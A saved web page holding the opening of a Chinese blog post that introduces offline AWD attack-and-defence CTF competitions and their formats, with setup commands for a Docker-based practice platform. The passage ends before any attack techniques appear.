@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<!-- saved from url=(0041)https://jlkl.github.io/2019/02/08/Web_13/ -->
+<html lang="en" data-redeviation-bs-uid="gk7n05u1zet"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://jlkl.github.io/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/Str3am.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/Str3am.jpg">
+  <link rel="mask-icon" href="https://jlkl.github.io/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/main.css">
+
+<link rel="stylesheet" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/css">
+<link rel="stylesheet" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/font-awesome.min.css">
+  <link rel="stylesheet" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/pace-theme-minimal.min.css">
+  <script src="https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985"></script><script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://jlkl.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="0X00 前言安洵杯线下一脸懵逼，西石油线下毫无悬念被打爆，于是有了整理实践线下文章资料的念头，同时也感谢 DOg3@Ph0rse 的分享。萌新文章，大佬们可以不用care了。 0x01 关于线下 AWD模式：Attack With Defence，攻击中防御，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。  高地模式：每">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF线下赛AWD新手入门Web篇">
+<meta property="og:url" content="https://jlkl.github.io/2019/02/08/Web_13/index.html">
+<meta property="og:site_name" content="Str3am&#39;s Blog">
+<meta property="og:description" content="0X00 前言安洵杯线下一脸懵逼，西石油线下毫无悬念被打爆，于是有了整理实践线下文章资料的念头，同时也感谢 DOg3@Ph0rse 的分享。萌新文章，大佬们可以不用care了。 0x01 关于线下 AWD模式：Attack With Defence，攻击中防御，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。  高地模式：每">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190206162649.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190207165325.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190207172500.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190207173536.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190207182658.png">
+<meta property="og:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190206164035.png">
+<meta property="article:published_time" content="2019-02-08T06:36:35.000Z">
+<meta property="article:modified_time" content="2019-02-08T06:42:20.000Z">
+<meta property="article:author" content="Str3am">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlkl.github.io/2019/02/08/Web_13/20190206162649.png">
+
+<link rel="canonical" href="https://jlkl.github.io/2019/02/08/Web_13/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>CTF线下赛AWD新手入门Web篇 | Str3am's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?fcdffc3f3c9531fca765ea966be04985";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="https://jlkl.github.io/atom.xml" title="Str3am&#39;s Blog" type="application/atom+xml">
+<style type="text/css">.heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}</style><script src="./CTF线下赛AWD新手入门Web篇 _ Str3am&#39;s Blog_files/Valine.min.js"></script><style class="redeviation-bs-style" data-name="content">/*! (c) Philipp Koenig under GPL-3.0 */
+body>div#redeviation-bs-indicator>div{opacity:0;pointer-events:none}body>#redeviation-bs-overlay.redeviation-bs-visible,body>#redeviation-bs-sidebar.redeviation-bs-visible{opacity:1;pointer-events:auto}body.redeviation-bs-noscroll{overflow:hidden !important}body>div#redeviation-bs-indicator>div{position:absolute;transform:translate3d(-40px, 0, 0);top:0;left:0;width:40px !important;height:100%;background:rgba(0,0,0,0.5);border-radius:0 10px 10px 0;transition:opacity .3s,transform .3s;z-index:2}body>div#redeviation-bs-indicator>div>span{-webkit-mask:no-repeat center/32px;-webkit-mask-image:url(chrome-extension://jdbnofccmhefkmjbkkdkfiicjkgofkdh/img/icon-bookmark.svg);background-color:#ffffff;position:absolute;display:block;top:0;left:0;width:100%;height:100%}body>div#redeviation-bs-indicator[data-pos=right]{left:auto;right:0}body>div#redeviation-bs-indicator[data-pos=right]>div{transform:translate3d(40px, 0, 0);left:auto;right:0;border-radius:10px 0 0 10px}body>div#redeviation-bs-indicator.redeviation-bs-fullHeight>div{border-radius:0}body>div#redeviation-bs-indicator.redeviation-bs-hover>div{transform:translate3d(0, 0, 0);opacity:1}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb{height:100% !important;top:0 !important}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div{background:rgba(0,0,0,0)}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div>span{-webkit-mask-position-y:20px}body>#redeviation-bs-sidebar{width:350px;max-width:none;height:0;z-index:2147483646;background-color:rgba(255,255,255,0.8) !important;color-scheme:auto !important;speak:none;border:none;display:block !important;transform:translate3d(-350px, 0, 0);transition:width 0s .3s,height 0s .3s,opacity .3s,transform .3s}body>#redeviation-bs-sidebar[data-pos=right]{left:auto;right:0;transform:translate3d(350px, 0, 0)}body>#redeviation-bs-sidebar.redeviation-bs-visible{width:calc(100% + 350px);height:100%;transform:translate3d(0, 0, 0);transition:opacity .3s,transform .3s}body>#redeviation-bs-sidebar.sidepanel{width:100% !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask{background:none !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask:not(.redeviation-bs-hover){width:calc(350px + 50px)}body>#redeviation-bs-overlay{width:100%;max-width:none;height:100%;z-index:2147483647;border:none;speak:none;background:rgba(0,0,0,0.5) !important;color-scheme:auto !important;transition:opacity .3s}</style><style type="text/css">.v[data-class=v]{font-size:16px;text-align:left}.v[data-class=v] *{-webkit-box-sizing:border-box;box-sizing:border-box;line-height:1.75}.v[data-class=v] .vinput,.v[data-class=v] .veditor,.v[data-class=v] p,.v[data-class=v] pre code,.v[data-class=v] .status-bar{color:#555}.v[data-class=v] .vtime,.v[data-class=v] .vsys{color:#b3b3b3}.v[data-class=v] .text-right{text-align:right}.v[data-class=v] .text-center{text-align:center}.v[data-class=v] img{max-width:100%;border:none}.v[data-class=v] hr{margin:.825em 0;border-color:#f6f6f6;border-style:dashed}.v[data-class=v].hide-avatar .vimg{display:none}.v[data-class=v] a{position:relative;cursor:pointer;color:#1abc9c;text-decoration:none;display:inline-block}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] pre,.v[data-class=v] code{background-color:#f8f8f8;padding:.2em .4em;border-radius:3px;font-size:85%;margin:0}.v[data-class=v] pre{padding:10px;overflow:auto;line-height:1.45}.v[data-class=v] pre code{padding:0;background:transparent;white-space:pre-wrap;word-break:keep-all}.v[data-class=v] blockquote{color:#666;margin:.5em 0;padding:0 0 0 1em;border-left:8px solid rgba(238,238,238,.5)}.v[data-class=v] .vinput{border:none;resize:none;outline:none;padding:10px 5px;max-width:100%;font-size:.775em;-webkit-box-sizing:border-box;box-sizing:border-box}.v[data-class=v] input[type=checkbox],.v[data-class=v] input[type=radio]{display:inline-block;vertical-align:middle;margin-top:-2px}.v[data-class=v] .vicon{cursor:pointer;display:inline-block;overflow:hidden;fill:#555;vertical-align:middle}.v[data-class=v] .vicon+.vicon{margin-left:10px}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vrow{font-size:0;padding:10px 0}.v[data-class=v] .vrow .vcol{display:inline-block;vertical-align:middle;font-size:14px}.v[data-class=v] .vrow .vcol.vcol-20{width:20%}.v[data-class=v] .vrow .vcol.vcol-30{width:30%}.v[data-class=v] .vrow .vcol.vcol-40{width:40%}.v[data-class=v] .vrow .vcol.vcol-50{width:50%}.v[data-class=v] .vrow .vcol.vcol-60{width:60%}.v[data-class=v] .vrow .vcol.vcol-70{width:70%}.v[data-class=v] .vrow .vcol.vcol-80{width:80%}.v[data-class=v] .vrow .vcol.vctrl{font-size:12px}.v[data-class=v] .vemoji,.v[data-class=v] .emoji{width:26px;height:26px;overflow:hidden;vertical-align:middle;margin:0 1px;display:inline-block}.v[data-class=v] .vwrap{border:1px solid #f0f0f0;border-radius:4px;margin-bottom:10px;overflow:hidden;position:relative;padding:10px}.v[data-class=v] .vwrap input{background:transparent}.v[data-class=v] .vwrap .vedit{position:relative;padding-top:10px}.v[data-class=v] .vwrap .cancel-reply-btn{position:absolute;right:5px;top:5px;cursor:pointer}.v[data-class=v] .vwrap .vemojis{display:none;font-size:18px;max-height:145px;overflow:auto;padding-bottom:10px;-webkit-box-shadow:0px 0 1px #f0f0f0;box-shadow:0px 0 1px #f0f0f0}.v[data-class=v] .vwrap .vemojis i{font-style:normal;padding-top:7px;width:36px;cursor:pointer;text-align:center;display:inline-block;vertical-align:middle}.v[data-class=v] .vwrap .vpreview{padding:7px;-webkit-box-shadow:0px 0 1px #f0f0f0;box-shadow:0px 0 1px #f0f0f0}.v[data-class=v] .vwrap .vheader .vinput{width:33.33%;border-bottom:1px #dedede dashed}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:50%}.v[data-class=v] .vwrap .vheader.item1 .vinput{width:100%}.v[data-class=v] .vwrap .vheader .vinput:focus{border-bottom-color:#eb5055}@media screen and (max-width: 520px){.v[data-class=v] .vwrap .vheader .vinput{width:100%}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:100%}}.v[data-class=v] .vpower{color:#999;font-size:.75em;padding:.5em 0}.v[data-class=v] .vpower a{font-size:.75em}.v[data-class=v] .vcount{padding:5px;font-weight:600;font-size:1.25em}.v[data-class=v] ul,.v[data-class=v] ol{padding:0;margin-left:1.25em}.v[data-class=v] .txt-center{text-align:center}.v[data-class=v] .txt-right{text-align:right}.v[data-class=v] .veditor{width:100%;min-height:8.75em;font-size:.875em;background:transparent;resize:vertical;-webkit-transition:all .25s ease;transition:all .25s ease}.v[data-class=v] .vbtn{-webkit-transition-duration:.4s;transition-duration:.4s;text-align:center;color:#555;border:1px solid #ededed;border-radius:.3em;display:inline-block;background:transparent;margin-bottom:0;font-weight:400;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;white-space:nowrap;padding:.5em 1.25em;font-size:.875em;line-height:1.42857143;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;outline:none}.v[data-class=v] .vbtn+.vbtn{margin-left:1.25em}.v[data-class=v] .vbtn:active,.v[data-class=v] .vbtn:hover{color:#3090e4;border-color:#3090e4}.v[data-class=v] .vbtn:disabled{border-color:#e1e1e1;color:#e1e1e1;background-color:#fdfafa;cursor:not-allowed}.v[data-class=v] .vempty{padding:1.25em;text-align:center;color:#555;overflow:auto}.v[data-class=v] .vsys{display:inline-block;padding:.2em .5em;font-size:.75em;border-radius:.2em;margin-right:.3em}@media screen and (max-width: 520px){.v[data-class=v] .vsys{display:none}}.v[data-class=v] .vcards{width:100%}.v[data-class=v] .vcards .vcard{padding-top:1.25em;position:relative;display:block}.v[data-class=v] .vcards .vcard:after{content:"";clear:both;display:block}.v[data-class=v] .vcards .vcard .vimg{width:3.125em;height:3.125em;float:left;border-radius:50%;margin-right:.7525em;border:1px solid #f5f5f5;padding:.125em}@media screen and (max-width: 720px){.v[data-class=v] .vcards .vcard .vimg{width:2.5em;height:2.5em}}.v[data-class=v] .vcards .vcard .vhead{line-height:1.5;margin-top:0}.v[data-class=v] .vcards .vcard .vhead .vnick{position:relative;font-size:.875em;font-weight:500;margin-right:.875em;cursor:pointer;text-decoration:none;display:inline-block}.v[data-class=v] .vcards .vcard .vhead .vnick:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vh{overflow:hidden;padding-bottom:.5em;border-bottom:1px dashed #f5f5f5}.v[data-class=v] .vcards .vcard .vh .vtime{font-size:.75em;margin-right:.875em}.v[data-class=v] .vcards .vcard .vh .vmeta{line-height:1;position:relative}.v[data-class=v] .vcards .vcard .vh .vmeta .vat{font-size:.8125em;color:#ef2f11;cursor:pointer;float:right}.v[data-class=v] .vcards .vcard:last-child .vh{border-bottom:none}.v[data-class=v] .vcards .vcard .vcontent{word-wrap:break-word;word-break:break-all;font-size:.875em;line-height:2;position:relative;margin-bottom:.75em;padding-top:.625em}.v[data-class=v] .vcards .vcard .vcontent.expand{cursor:pointer;max-height:8em;overflow:hidden}.v[data-class=v] .vcards .vcard .vcontent.expand::before{display:block;content:"";position:absolute;width:100%;left:0;top:0;bottom:3.15em;background:-webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(rgba(255, 255, 255, 0.9)));background:linear-gradient(180deg, rgba(255, 255, 255, 0), rgba(255, 255, 255, 0.9));z-index:999}.v[data-class=v] .vcards .vcard .vcontent.expand::after{display:block;content:attr(data-expand);text-align:center;color:#828586;position:absolute;width:100%;height:3.15em;line-height:3.15em;left:0;bottom:0;z-index:999;background:rgba(255,255,255,.9)}.v[data-class=v] .vcards .vcard .vquote{padding-left:1em;border-left:1px dashed rgba(238,238,238,.5)}.v[data-class=v] .vcards .vcard .vquote .vimg{width:2.225em;height:2.225em}.v[data-class=v] .vpage .vmore{margin:1em 0}.v[data-class=v] .clear{content:"";display:block;clear:both}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-webkit-keyframes pulse{50%{background:#dcdcdc}}@keyframes pulse{50%{background:#dcdcdc}}.v[data-class=v] .vspinner{width:22px;height:22px;display:inline-block;border:6px double #a0a0a0;border-top-color:transparent;border-bottom-color:transparent;border-radius:50%;-webkit-animation:spin 1s infinite linear;animation:spin 1s infinite linear;position:relative;vertical-align:middle;margin:0 5px}[data-theme=dark] .v[data-class=v] .vinput,[data-theme=dark] .v[data-class=v] .veditor,[data-theme=dark] .v[data-class=v] p,[data-theme=dark] .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] .status-bar,.dark .v[data-class=v] .vinput,.dark .v[data-class=v] .veditor,.dark .v[data-class=v] p,.dark .v[data-class=v] pre code,.dark .v[data-class=v] .status-bar,.theme__dark .v[data-class=v] .vinput,.theme__dark .v[data-class=v] .veditor,.theme__dark .v[data-class=v] p,.theme__dark .v[data-class=v] pre code,.theme__dark .v[data-class=v] .status-bar,.night .v[data-class=v] .vinput,.night .v[data-class=v] .veditor,.night .v[data-class=v] p,.night .v[data-class=v] pre code,.night .v[data-class=v] .status-bar{color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vtime,[data-theme=dark] .v[data-class=v] .vsys,.dark .v[data-class=v] .vtime,.dark .v[data-class=v] .vsys,.theme__dark .v[data-class=v] .vtime,.theme__dark .v[data-class=v] .vsys,.night .v[data-class=v] .vtime,.night .v[data-class=v] .vsys{color:#929298}[data-theme=dark] .v[data-class=v] pre,[data-theme=dark] .v[data-class=v] code,[data-theme=dark] .v[data-class=v] pre code,.dark .v[data-class=v] pre,.dark .v[data-class=v] code,.dark .v[data-class=v] pre code,.theme__dark .v[data-class=v] pre,.theme__dark .v[data-class=v] code,.theme__dark .v[data-class=v] pre code,.night .v[data-class=v] pre,.night .v[data-class=v] code,.night .v[data-class=v] pre code{color:#929298;background-color:#151414}[data-theme=dark] .v[data-class=v] .vwrap,.dark .v[data-class=v] .vwrap,.theme__dark .v[data-class=v] .vwrap,.night .v[data-class=v] .vwrap{border-color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vicon,.dark .v[data-class=v] .vicon,.theme__dark .v[data-class=v] .vicon,.night .v[data-class=v] .vicon{fill:#b2b2b5}[data-theme=dark] .v[data-class=v] .vicon.actived,.dark .v[data-class=v] .vicon.actived,.theme__dark .v[data-class=v] .vicon.actived,.night .v[data-class=v] .vicon.actived{fill:#66b1ff}[data-theme=dark] .v[data-class=v] .vbtn,.dark .v[data-class=v] .vbtn,.theme__dark .v[data-class=v] .vbtn,.night .v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}[data-theme=dark] .v[data-class=v] .vbtn:hover,.dark .v[data-class=v] .vbtn:hover,.theme__dark .v[data-class=v] .vbtn:hover,.night .v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}[data-theme=dark] .v[data-class=v] a:hover,.dark .v[data-class=v] a:hover,.theme__dark .v[data-class=v] a:hover,.night .v[data-class=v] a:hover{color:#d7191a}[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand::before,.dark .v[data-class=v] .vcards .vcard .vcontent.expand::before,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand::before,.night .v[data-class=v] .vcards .vcard .vcontent.expand::before{background:-webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.3)), to(rgba(0, 0, 0, 0.7)));background:linear-gradient(180deg, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.7))}[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand::after,.dark .v[data-class=v] .vcards .vcard .vcontent.expand::after,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand::after,.night .v[data-class=v] .vcards .vcard .vcontent.expand::after{background:rgba(0,0,0,.7)}@media(prefers-color-scheme: dark){.v[data-class=v] .vinput,.v[data-class=v] .veditor,.v[data-class=v] p,.v[data-class=v] pre code,.v[data-class=v] .status-bar{color:#b2b2b5}.v[data-class=v] .vtime,.v[data-class=v] .vsys{color:#929298}.v[data-class=v] pre,.v[data-class=v] code,.v[data-class=v] pre code{color:#929298;background-color:#151414}.v[data-class=v] .vwrap{border-color:#b2b2b5}.v[data-class=v] .vicon{fill:#b2b2b5}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vcontent.expand::before{background:-webkit-gradient(linear, left top, left bottom, from(rgba(0, 0, 0, 0.3)), to(rgba(0, 0, 0, 0.7)));background:linear-gradient(180deg, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.7))}.v[data-class=v] .vcards .vcard .vcontent.expand::after{background:rgba(0,0,0,.7)}}</style></head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" class="  pace-done"><div class="pace  pace-inactive"><div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
+  <div class="pace-progress-inner"></div>
+</div>
+<div class="pace-activity"></div></div>
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="https://jlkl.github.io/" class="brand" rel="start" style="opacity: 1;">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title" style="opacity: 1; top: 0px;">Str3am's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home" style="opacity: 1; transform: translateY(0px);">
+
+    <a href="https://jlkl.github.io/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about" style="opacity: 1; transform: translateY(0px);">
+
+    <a href="https://jlkl.github.io/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags" style="opacity: 1; transform: translateY(0px);">
+
+    <a href="https://jlkl.github.io/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives" style="opacity: 1; transform: translateY(0px);">
+
+    <a href="https://jlkl.github.io/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives<span class="badge">43</span></a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top back-to-top-on">
+    <i class="fa fa-arrow-up"></i>
+    <span>88%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope="" itemtype="http://schema.org/Article" class="post-block" lang="en" style="opacity: 1; display: block;">
+    <link itemprop="mainEntityOfPage" href="https://jlkl.github.io/2019/02/08/Web_13/">
+
+    <span hidden="" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Str3am.jpg">
+      <meta itemprop="name" content="Str3am">
+      <meta itemprop="description" content="这个人很懒，什么也没留下">
+    </span>
+
+    <span hidden="" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Str3am&#39;s Blog">
+    </span>
+      <header class="post-header" style="opacity: 1; display: block; transform: translateY(0px);">
+        <h1 class="post-title" itemprop="name headline">
+          CTF线下赛AWD新手入门Web篇
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2019-02-08 14:36:35 / Modified: 14:42:20" itemprop="dateCreated datePublished" datetime="2019-02-08T14:36:35+08:00">2019-02-08</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: inline;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv">4574</span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="https://jlkl.github.io/2019/02/08/Web_13/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/02/08/Web_13/" itemprop="commentCount">2</span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              <span>6.9k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              <span>9 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody" style="opacity: 1; display: block; transform: translateY(0px);">
+
+      
+        <h2 id="0X00-前言"><a href="https://jlkl.github.io/2019/02/08/Web_13/#0X00-%E5%89%8D%E8%A8%80" class="headerlink" title="0X00 前言"></a>0X00 前言</h2><p>安洵杯线下一脸懵逼，西石油线下毫无悬念被打爆，于是有了整理实践线下文章资料的念头，同时也感谢 DOg3@Ph0rse 的分享。萌新文章，大佬们可以不用care了。</p>
+<h2 id="0x01-关于线下"><a href="https://jlkl.github.io/2019/02/08/Web_13/#0x01-%E5%85%B3%E4%BA%8E%E7%BA%BF%E4%B8%8B" class="headerlink" title="0x01 关于线下"></a>0x01 关于线下</h2><ol>
+<li><p>AWD模式：Attack With Defence，攻击中防御，比赛中每个队伍维护多台服务器，服务器中存在多个漏洞，利用漏洞攻击其他队伍可以进行得分，修复漏洞可以避免被其他队伍攻击失分。</p>
+</li>
+<li><p>高地模式：每只队伍服务器可以访问，没有权限，需要自己去获取权限。同时存在高地服务器，不属于任何一支队伍，每只队伍竞争高地服务器权限。</p>
+</li>
+<li><p>域渗透：Windows AD 域环境，更贴近实战</p>
+</li>
+</ol>
+<p>更加详细可参见：<a href="https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/introduction/mode/#-attack-defense</a></p>
+<a id="more"></a>
+<h2 id="0X02-环境搭建"><a href="https://jlkl.github.io/2019/02/08/Web_13/#0X02-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA" class="headerlink" title="0X02 环境搭建"></a>0X02 环境搭建</h2><p>AWD 线下赛个人觉得主要靠平时的积累和脚本的编写，引用彭哥的话来说，没经验打不过别人导致得不到锻炼就造成了恶性循环，所以平时能自己搭建环境训练是很有必要的。</p>
+<p>这里选用一套开源的框架，采用docker，内含多个环境及环境对应 write up，也可以自己搭建，框架有一点小毛病，但并不影响使用。</p>
+<p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="noopener">https://github.com/zhl2008/awd-platform</a></p>
+<p>简要步骤（详细可查看手册）：</p>
+<div class="highlight-container"><figure class="highlight crmsh"><div class="table-container"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 下载github项目</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/zhl2008/awd-platform.git</span><br><span class="line"><span class="comment">## 下载镜像，并改名</span></span><br><span class="line">docker pull zhl2008/web_14.<span class="number">04</span></span><br><span class="line">docker <span class="keyword">tag</span> <span class="title">zhl2008</span>/web_14.<span class="number">04</span> web_14.<span class="number">04</span></span><br><span class="line"><span class="comment">## 建立队伍floder</span></span><br><span class="line">python batch.py web_dir team_number</span><br><span class="line"><span class="comment">## 启动比赛</span></span><br><span class="line">python <span class="literal">start</span>.py ./ team_number</span><br><span class="line">    for example: python <span class="literal">start</span>.py ./ <span class="number">5</span></span><br><span class="line"><span class="comment">## 启动check脚本</span></span><br><span class="line">docker exec check_server</span><br><span class="line">python check.py</span><br></pre></td></tr></tbody></table></div></figure><div class="copy-btn"><i class="fa fa-clipboard"></i></div></div>
+
+<p>这里开启了4个队伍，Web 服务对应 8801，8802，8803，8804 端口</p>
